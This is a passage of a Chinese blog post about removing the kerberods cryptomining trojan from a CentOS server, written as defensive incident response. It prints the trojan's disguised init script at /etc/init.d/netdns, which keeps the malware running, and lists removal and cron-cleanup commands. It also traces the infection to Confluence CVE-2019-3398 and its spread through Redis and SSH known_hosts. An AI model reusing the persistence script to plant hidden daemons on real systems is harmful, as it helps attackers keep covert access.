class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos init.d]<span class="comment"># cat /etc/init.d/netdns </span></span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"><span class="comment">#chkconfig: - 99 01</span></span><br><span class="line"><span class="comment">#description: kerberods daemon</span></span><br><span class="line"><span class="comment">#processname: /usr/sbin/kerberods</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:     /user/sbin/kerberods</span></span><br><span class="line"><span class="comment"># Required-Start:</span></span><br><span class="line"><span class="comment"># Required-Stop:</span></span><br><span class="line"><span class="comment"># Default-Start:        2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:         0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: kerberods deamon</span></span><br><span class="line"><span class="comment"># Description:          kerberods deamon</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line">LocalPath=<span class="string">&quot;/usr/sbin/kerberods&quot;</span></span><br><span class="line">name=<span class="string">&#x27;kerberods&#x27;</span></span><br><span class="line">pid_file=<span class="string">&quot;/tmp/.X11unix&quot;</span></span><br><span class="line">stdout_log=<span class="string">&quot;/var/log/<span class="variable">$name</span>.log&quot;</span></span><br><span class="line">stderr_log=<span class="string">&quot;/var/log/<span class="variable">$name</span>.err&quot;</span></span><br><span class="line"><span class="function"><span class="title">get_pid</span></span>()&#123;</span><br><span class="line">    <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">is_running</span></span>()&#123;</span><br><span class="line">    [ -f <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span> ] &amp;&amp;/usr/sbin/kerberods -Pid $(get_pid) &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Already started&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$name</span>&quot;</span></span><br><span class="line">        <span class="variable">$LocalPath</span> &gt;&gt;<span class="string">&quot;<span class="variable">$stdout_log</span>&quot;</span> 2&gt;&gt; <span class="string">&quot;<span class="variable">$stderr_log</span>&quot;</span> &amp;</span><br><span class="line">        <span class="built_in">echo</span> $! &gt; <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> ! is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Unable to start, see<span class="variable">$stdout_log</span> and <span class="variable">$stderr_log</span>&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Stopping<span class="variable">$name</span>..&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> $(get_pid)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10&#125;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> ! is_running; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            <span class="built_in">echo</span> -n <span class="string">&quot;.&quot;</span></span><br><span class="line">            <span class="built_in">sleep</span> 1</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Not stopped; maystill be shutting down or shutdown may have failed&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Stopped&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span>]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Not running&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line">    <span class="variable">$0</span> stop</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Unable to stop, will notattempt to start&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="variable">$0</span> start</span><br><span class="line">;;</span><br><span class="line">status)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stopped&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span>&#123;start|stop|restart|status&#125;&quot;</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>kerberods木马二进程文件 &#x2F;usr&#x2F;sbin&#x2F;kerberods，需要upx脱壳，具体的可以参考<a target="_blank" rel="noopener" href="https://laucyun.com/17e194c26e4554cab975aae760bad553.html">https://laucyun.com/17e194c26e4554cab975aae760bad553.html</a></li>
+</ul>
+<p><strong>最后汇总下杀毒步骤及注意事项</strong> - 删除木马及启动服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/sbin/kerberods</span><br><span class="line">rm -rf /etc/init.d/netdns</span><br><span class="line">rm -rf /etc/rc.d/rc0.d/K01netdns</span><br><span class="line">rm -rf /etc/rc.d/rc1.d/K01netdns</span><br><span class="line">rm -rf /etc/rc.d/rc2.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc3.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc4.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc5.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc6.d/K01netdns</span><br><span class="line">rm -rf /etc/systemd/system/multi-user.target.wants/netdns.service</span><br><span class="line">rm -rf /usr/lib/systemd/system/netdns.servic</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>删除计划任务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /etc/crond.d/tomcat</span><br><span class="line">&gt; /var/spool/cron/root ;chattr +i root </span><br><span class="line">&gt; /var/spool/cron/crontabs/root ;chattr +i root </span><br><span class="line">&gt; /etc/cron.d/root ;chattr +i root </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>redis清空相关配置及设置密钥，不要用root账号运行redis</p>
+</li>
+<li><p>修改hosts文件设置pastebin.com解析</p>
+</li>
+<li><p>重启（如果不重启，有些进制驻留到内存不能释放）</p>
+</li>
+<li><p>htop，top等命令还是显示不了多核心，可以重新部署系统</p>
+</li>
+<li><p>检查&#x2F;root&#x2F;.ssh&#x2F;known_hosts里面服务器是否也有相关问题</p>
+</li>
+<li><p>做好安全组云服务虽然有VPC隔离但是并不安全，如果不限制好安全组其他中毒的服务器容易攻击</p>
+</li>
+</ul>
+<p><strong>事后发现最终原因</strong></p>
+<blockquote>
+<p>情报名称<br>Confluence 路径穿越漏洞安全预警（CVE-2019-3398） 风险等级<br>严重 情报概述<br>近日，腾讯云安全中心监测到 Confluence官方发布安全公告，披露了Confluence Server 和 Data Center 产品在 downloadallattachments 资源中存在的一个路径穿越漏洞，攻击者可利用该漏洞写入恶意文件导致代码执行。 为避免您的业务受影响，腾讯云安全中心建议您及时开展安全自查，如在受影响范围，请您及时进行更新修复，避免被外部攻击者入侵</p>
+</blockquote>
+<p><strong>逆向工程</strong> Confluence网站80端口对公网开放，黑客利用漏洞入侵，下载病毒到Confluence服务器，然后病毒根据.ssh&#x2F;known_hosts文件扫描服务器及所在网段redis服务，如果redis服务为授权就会有如上redis服务哪一堆骚操作了，会通过redis把下载并执行病毒的操作写入计划任务里。最后就算内网没有redis服务也会尝试暴力破解的方式攻击内网服务器，所以内网弱密码同样是重灾区。云服务器的安全很重要，要不然病毒会在整个云环境中蔓延。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/redis/" rel="tag"># redis</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/09/2019/04/2019-04-09-java%E7%BA%BF%E7%A8%8B%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/index/" rel="prev" title="Java线程泄露问题分析">
+      <i class="fa fa-chevron-left"></i> Java线程泄露问题分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/15/2019/04/2019-04-15-%E5%85%B3%E9%94%AE%E6%8F%90%E9%97%AE/index/" rel="next" title="关键提问">
+      关键提问 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Jerry Min</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">260</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jerry Min</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
